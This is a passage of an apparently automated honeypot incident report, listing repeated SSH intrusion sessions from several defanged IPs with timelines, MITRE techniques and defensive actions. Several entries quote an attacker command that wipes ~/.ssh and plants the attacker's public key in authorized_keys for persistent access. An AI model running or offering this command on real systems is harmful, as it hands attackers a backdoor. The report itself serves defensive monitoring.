| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 16:52:21` | `cowrie.session.connect` |
| `2026-04-21 16:52:21` | `cowrie.client.version` |
| `2026-04-21 16:52:21` | `cowrie.client.kex` |
| `2026-04-21 16:52:22` | `cowrie.login.success` |
| `2026-04-21 16:52:22` | `cowrie.session.params` |
| `2026-04-21 16:52:22` | `cowrie.command.input` |
| `2026-04-21 16:52:22` | `cowrie.command.failed` |
| `2026-04-21 16:52:22` | `cowrie.log.closed` |
| `2026-04-21 16:52:23` | `cowrie.session.params` |
| `2026-04-21 16:52:23` | `cowrie.command.input` |
| `2026-04-21 16:52:23` | `cowrie.session.file_download` |
| `2026-04-21 16:52:23` | `cowrie.log.closed` |
| `2026-04-21 16:52:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.35.127[.]66` to AbuseIPDB if not already reported
- [ ] Block `118.35.127[.]66` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d19ec5763bde

| Field | Detail |
|---|---|
| **Source IP** | `118.35.127[.]66` |
| **First Seen** | 2026-04-21 16:52 |
| **Last Seen** | 2026-04-21 16:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 16:52:25` | `cowrie.session.connect` |
| `2026-04-21 16:52:25` | `cowrie.client.version` |
| `2026-04-21 16:52:25` | `cowrie.client.kex` |
| `2026-04-21 16:52:26` | `cowrie.login.success` |
| `2026-04-21 16:52:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.35.127[.]66` to AbuseIPDB if not already reported
- [ ] Block `118.35.127[.]66` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2309d09d1b0a

| Field | Detail |
|---|---|
| **Source IP** | `103.182.132[.]154` |
| **First Seen** | 2026-04-21 16:53 |
| **Last Seen** | 2026-04-21 16:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 16:53:12` | `cowrie.session.connect` |
| `2026-04-21 16:53:12` | `cowrie.client.version` |
| `2026-04-21 16:53:12` | `cowrie.client.kex` |
| `2026-04-21 16:53:12` | `cowrie.login.success` |
| `2026-04-21 16:53:12` | `cowrie.session.params` |
| `2026-04-21 16:53:12` | `cowrie.command.input` |
| `2026-04-21 16:53:12` | `cowrie.command.failed` |
| `2026-04-21 16:53:12` | `cowrie.log.closed` |
| `2026-04-21 16:53:12` | `cowrie.session.params` |
| `2026-04-21 16:53:12` | `cowrie.command.input` |
| `2026-04-21 16:53:12` | `cowrie.session.file_download` |
| `2026-04-21 16:53:12` | `cowrie.log.closed` |
| `2026-04-21 16:53:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.182.132[.]154` to AbuseIPDB if not already reported
- [ ] Block `103.182.132[.]154` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-578dce3470bc

| Field | Detail |
|---|---|
| **Source IP** | `103.182.132[.]154` |
| **First Seen** | 2026-04-21 16:53 |
| **Last Seen** | 2026-04-21 16:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 16:53:13` | `cowrie.session.connect` |
| `2026-04-21 16:53:13` | `cowrie.client.version` |
| `2026-04-21 16:53:13` | `cowrie.client.kex` |
| `2026-04-21 16:53:14` | `cowrie.login.success` |
| `2026-04-21 16:53:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.182.132[.]154` to AbuseIPDB if not already reported
- [ ] Block `103.182.132[.]154` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed14fcddfea1

| Field | Detail |
|---|---|
| **Source IP** | `103.182.132[.]154` |
| **First Seen** | 2026-04-21 16:54 |
| **Last Seen** | 2026-04-21 16:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 16:54:10` | `cowrie.session.connect` |
| `2026-04-21 16:54:10` | `cowrie.client.version` |
| `2026-04-21 16:54:10` | `cowrie.client.kex` |
| `2026-04-21 16:54:10` | `cowrie.login.success` |
| `2026-04-21 16:54:10` | `cowrie.session.params` |
| `2026-04-21 16:54:10` | `cowrie.command.input` |
| `2026-04-21 16:54:10` | `cowrie.command.failed` |
| `2026-04-21 16:54:10` | `cowrie.log.closed` |
| `2026-04-21 16:54:10` | `cowrie.session.params` |
| `2026-04-21 16:54:10` | `cowrie.command.input` |
| `2026-04-21 16:54:10` | `cowrie.session.file_download` |
| `2026-04-21 16:54:10` | `cowrie.log.closed` |
| `2026-04-21 16:54:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.182.132[.]154` to AbuseIPDB if not already reported
- [ ] Block `103.182.132[.]154` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7e449186f1c

| Field | Detail |
|---|---|
| **Source IP** | `103.182.132[.]154` |
| **First Seen** | 2026-04-21 16:54 |
| **Last Seen** | 2026-04-21 16:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 16:54:11` | `cowrie.session.connect` |
| `2026-04-21 16:54:11` | `cowrie.client.version` |
| `2026-04-21 16:54:11` | `cowrie.client.kex` |
| `2026-04-21 16:54:12` | `cowrie.login.success` |
| `2026-04-21 16:54:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.182.132[.]154` to AbuseIPDB if not already reported
- [ ] Block `103.182.132[.]154` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35d304af884d

| Field | Detail |
|---|---|
| **Source IP** | `213.176.16[.]28` |
| **First Seen** | 2026-04-21 16:55 |
| **Last Seen** | 2026-04-21 16:55 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 16:55:14` | `cowrie.session.connect` |
| `2026-04-21 16:55:15` | `cowrie.client.version` |
| `2026-04-21 16:55:15` | `cowrie.client.kex` |
| `2026-04-21 16:55:16` | `cowrie.login.success` |
| `2026-04-21 16:55:16` | `cowrie.session.params` |
| `2026-04-21 16:55:16` | `cowrie.command.input` |
| `2026-04-21 16:55:16` | `cowrie.command.failed` |
| `2026-04-21 16:55:17` | `cowrie.log.closed` |
| `2026-04-21 16:55:17` | `cowrie.session.params` |
| `2026-04-21 16:55:17` | `cowrie.command.input` |
| `2026-04-21 16:55:17` | `cowrie.session.file_download` |
| `2026-04-21 16:55:17` | `cowrie.log.closed` |
| `2026-04-21 16:55:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.176.16[.]28` to AbuseIPDB if not already reported
- [ ] Block `213.176.16[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-918c97d38107

| Field | Detail |
|---|---|
| **Source IP** | `213.176.16[.]28` |
| **First Seen** | 2026-04-21 16:55 |
| **Last Seen** | 2026-04-21 16:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 16:55:20` | `cowrie.session.connect` |
| `2026-04-21 16:55:20` | `cowrie.client.version` |
| `2026-04-21 16:55:21` | `cowrie.client.kex` |
| `2026-04-21 16:55:21` | `cowrie.login.success` |
| `2026-04-21 16:55:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.176.16[.]28` to AbuseIPDB if not already reported
- [ ] Block `213.176.16[.]28` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c5a13283d16

| Field | Detail |
|---|---|
| **Source IP** | `212.156.33[.]182` |
| **First Seen** | 2026-04-21 16:56 |
| **Last Seen** | 2026-04-21 16:56 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 16:56:35` | `cowrie.session.connect` |
| `2026-04-21 16:56:35` | `cowrie.client.version` |
| `2026-04-21 16:56:35` | `cowrie.client.kex` |
| `2026-04-21 16:56:36` | `cowrie.login.success` |
| `2026-04-21 16:56:37` | `cowrie.session.params` |
| `2026-04-21 16:56:37` | `cowrie.command.input` |
| `2026-04-21 16:56:37` | `cowrie.command.failed` |
| `2026-04-21 16:56:37` | `cowrie.log.closed` |
| `2026-04-21 16:56:37` | `cowrie.session.params` |
| `2026-04-21 16:56:37` | `cowrie.command.input` |
| `2026-04-21 16:56:37` | `cowrie.session.file_download` |
| `2026-04-21 16:56:37` | `cowrie.log.closed` |
| `2026-04-21 16:56:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.156.33[.]182` to AbuseIPDB if not already reported
- [ ] Block `212.156.33[.]182` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2cef8bb2513b

| Field | Detail |
|---|---|
| **Source IP** | `212.156.33[.]182` |
| **First Seen** | 2026-04-21 16:56 |
| **Last Seen** | 2026-04-21 16:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 16:56:40` | `cowrie.session.connect` |
| `2026-04-21 16:56:40` | `cowrie.client.version` |
| `2026-04-21 16:56:40` | `cowrie.client.kex` |
| `2026-04-21 16:56:41` | `cowrie.login.success` |
| `2026-04-21 16:56:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.156.33[.]182` to AbuseIPDB if not already reported
- [ ] Block `212.156.33[.]182` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e5db506c209

| Field | Detail |
|---|---|
| **Source IP** | `118.35.127[.]66` |
| **First Seen** | 2026-04-21 16:57 |
| **Last Seen** | 2026-04-21 16:57 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 16:57:38` | `cowrie.session.connect` |
| `2026-04-21 16:57:38` | `cowrie.client.version` |
| `2026-04-21 16:57:38` | `cowrie.client.kex` |
| `2026-04-21 16:57:39` | `cowrie.login.success` |
| `2026-04-21 16:57:39` | `cowrie.session.params` |
| `2026-04-21 16:57:39` | `cowrie.command.input` |
| `2026-04-21 16:57:39` | `cowrie.command.failed` |
| `2026-04-21 16:57:39` | `cowrie.log.closed` |
| `2026-04-21 16:57:40` | `cowrie.session.params` |
| `2026-04-21 16:57:40` | `cowrie.command.input` |
| `2026-04-21 16:57:40` | `cowrie.session.file_download` |
| `2026-04-21 16:57:40` | `cowrie.log.closed` |
| `2026-04-21 16:57:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.35.127[.]66` to AbuseIPDB if not already reported
- [ ] Block `118.35.127[.]66` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7c57881b813

| Field | Detail |
|---|---|
| **Source IP** | `118.35.127[.]66` |
| **First Seen** | 2026-04-21 16:57 |
| **Last Seen** | 2026-04-21 16:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 16:57:42` | `cowrie.session.connect` |
| `2026-04-21 16:57:42` | `cowrie.client.version` |
| `2026-04-21 16:57:42` | `cowrie.client.kex` |
| `2026-04-21 16:57:43` | `cowrie.login.success` |
| `2026-04-21 16:57:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.35.127[.]66` to AbuseIPDB if not already reported
- [ ] Block `118.35.127[.]66` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14cbfbfd58dc

| Field | Detail |
|---|---|
| **Source IP** | `212.156.33[.]182` |
| **First Seen** | 2026-04-21 17:00 |
| **Last Seen** | 2026-04-21 17:00 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 17:00:00` | `cowrie.session.connect` |
| `2026-04-21 17:00:00` | `cowrie.client.version` |
| `2026-04-21 17:00:01` | `cowrie.client.kex` |
| `2026-04-21 17:00:01` | `cowrie.login.success` |
| `2026-04-21 17:00:02` | `cowrie.session.params` |
| `2026-04-21 17:00:02` | `cowrie.command.input` |
| `2026-04-21 17:00:02` | `cowrie.command.failed` |
| `2026-04-21 17:00:02` | `cowrie.log.closed` |
| `2026-04-21 17:00:03` | `cowrie.session.params` |
| `2026-04-21 17:00:03` | `cowrie.command.input` |
| `2026-04-21 17:00:03` | `cowrie.session.file_download` |
| `2026-04-21 17:00:03` | `cowrie.log.closed` |
| `2026-04-21 17:00:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.156.33[.]182` to AbuseIPDB if not already reported
- [ ] Block `212.156.33[.]182` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-661824ba34c6

| Field | Detail |
|---|---|
| **Source IP** | `212.156.33[.]182` |
| **First Seen** | 2026-04-21 17:00 |
| **Last Seen** | 2026-04-21 17:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 17:00:05` | `cowrie.session.connect` |
| `2026-04-21 17:00:05` | `cowrie.client.version` |
| `2026-04-21 17:00:06` | `cowrie.client.kex` |
| `2026-04-21 17:00:06` | `cowrie.login.success` |
| `2026-04-21 17:00:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.156.33[.]182` to AbuseIPDB if not already reported
- [ ] Block `212.156.33[.]182` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9351e2a1c6ea

| Field | Detail |
|---|---|
| **Source IP** | `118.35.127[.]66` |
| **First Seen** | 2026-04-21 17:00 |
| **Last Seen** | 2026-04-21 17:00 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 17:00:12` | `cowrie.session.connect` |
| `2026-04-21 17:00:12` | `cowrie.client.version` |
| `2026-04-21 17:00:12` | `cowrie.client.kex` |
| `2026-04-21 17:00:12` | `cowrie.login.success` |
| `2026-04-21 17:00:13` | `cowrie.session.params` |
| `2026-04-21 17:00:13` | `cowrie.command.input` |
| `2026-04-21 17:00:13` | `cowrie.command.failed` |
| `2026-04-21 17:00:13` | `cowrie.log.closed` |
| `2026-04-21 17:00:13` | `cowrie.session.params` |
| `2026-04-21 17:00:13` | `cowrie.command.input` |
| `2026-04-21 17:00:13` | `cowrie.session.file_download` |
| `2026-04-21 17:00:13` | `cowrie.log.closed` |
| `2026-04-21 17:00:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.35.127[.]66` to AbuseIPDB if not already reported
- [ ] Block `118.35.127[.]66` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e83c017f10ea

| Field | Detail |
|---|---|
| **Source IP** | `118.35.127[.]66` |
| **First Seen** | 2026-04-21 17:00 |
| **Last Seen** | 2026-04-21 17:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 17:00:15` | `cowrie.session.connect` |
| `2026-04-21 17:00:15` | `cowrie.client.version` |
| `2026-04-21 17:00:15` | `cowrie.client.kex` |
| `2026-04-21 17:00:16` | `cowrie.login.success` |
| `2026-04-21 17:00:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.35.127[.]66` to AbuseIPDB if not already reported
- [ ] Block `118.35.127[.]66` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b3e6dc2f73a

| Field | Detail |
|---|---|
| **Source IP** | `212.156.33[.]182` |
| **First Seen** | 2026-04-21 17:01 |
| **Last Seen** | 2026-04-21 17:01 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 17:01:47` | `cowrie.session.connect` |
| `2026-04-21 17:01:47` | `cowrie.client.version` |
| `2026-04-21 17:01:47` | `cowrie.client.kex` |
| `2026-04-21 17:01:48` | `cowrie.login.success` |
| `2026-04-21 17:01:49` | `cowrie.session.params` |
| `2026-04-21 17:01:49` | `cowrie.command.input` |
| `2026-04-21 17:01:49` | `cowrie.command.failed` |
| `2026-04-21 17:01:49` | `cowrie.log.closed` |
| `2026-04-21 17:01:49` | `cowrie.session.params` |
| `2026-04-21 17:01:49` | `cowrie.command.input` |
| `2026-04-21 17:01:49` | `cowrie.session.file_download` |
| `2026-04-21 17:01:49` | `cowrie.log.closed` |
| `2026-04-21 17:01:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.156.33[.]182` to AbuseIPDB if not already reported
- [ ] Block `212.156.33[.]182` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-708d98e20f57

| Field | Detail |
|---|---|
| **Source IP** | `212.156.33[.]182` |
| **First Seen** | 2026-04-21 17:01 |
| **Last Seen** | 2026-04-21 17:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

